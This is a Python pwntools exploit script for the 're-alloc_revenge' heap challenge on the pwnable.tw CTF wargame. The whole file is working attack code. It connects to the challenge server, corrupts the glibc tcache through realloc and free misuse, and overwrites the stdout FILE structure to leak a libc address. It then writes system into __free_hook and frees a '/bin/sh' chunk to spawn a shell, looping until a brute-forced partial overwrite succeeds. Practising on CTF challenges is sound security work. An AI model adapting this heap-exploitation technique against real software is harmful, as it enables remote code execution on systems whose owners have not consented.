from pwn import *

context.log_level = 'debug'
prog = './re-alloc_revenge'
elf = ELF(prog)

libc = ELF("libc.so")
def dbg():
    gdb.attach(p)
    #if b == '':
    #	p.interactive()

def alloc(idx, size, content='a'):
	p.sendlineafter("choice: ", '1')
	p.sendlineafter("Index:", str(idx))
	p.sendlineafter("Size:", str(size))
	p.sendafter("Data:", content)
def realloc(idx, size, content='a'):
	p.sendlineafter("choice: ", '2')
	p.sendlineafter("Index:", str(idx))
	p.sendlineafter("Size:", str(size))
	if size != 0:
		p.sendafter("Data:", content)
def free(idx):
	p.sendlineafter("choice: ", '3')
	p.sendlineafter("Index:", str(idx))
def exp():
	try:
		global p
		#p = process(prog)
		p = remote('chall.pwnable.tw', 10310)
		alloc(0, 0x40)
		alloc(1, 0x40)
		free(0)
		realloc(1, 0)
		realloc(1, 0x40 ,'\x10\x60')
	
		alloc(0, 0x40)
		realloc(0, 0x50)
		free(0)
		alloc(0, 0x40, '\xff'*4+'\x00'*2+'\xff'*(0x40-6))
		realloc(0, 0x50)
		realloc(1, 0x70)
		free(1)
		alloc(1, 0x30)
		free(0)
		realloc(1, 0x30, 'a'*8+'\x58\x47')
		alloc(0, 0x60, '/bin/sh\x00'+p64(0xfbad1800)+p64(0)*3)
		p.recv(8)
		libc.address = u64(p.recv(6)+'\x00'*2)-0x7ffff7fc7570+0x7ffff7de0000
		log.info("libc.address ==> " + hex(libc.address))
		if libc.address & 0xff != 0:
					p.close()
					return False
		realloc(1, 0x30, 'a'*8+p64(libc.sym['__free_hook']))
		free(1)
		alloc(1, 0x60, p64(libc.sym['system']))
		free(0)
	except:
		p.close()
		return False
	p.interactive()
if __name__ == '__main__':
	while not exp():
		pass
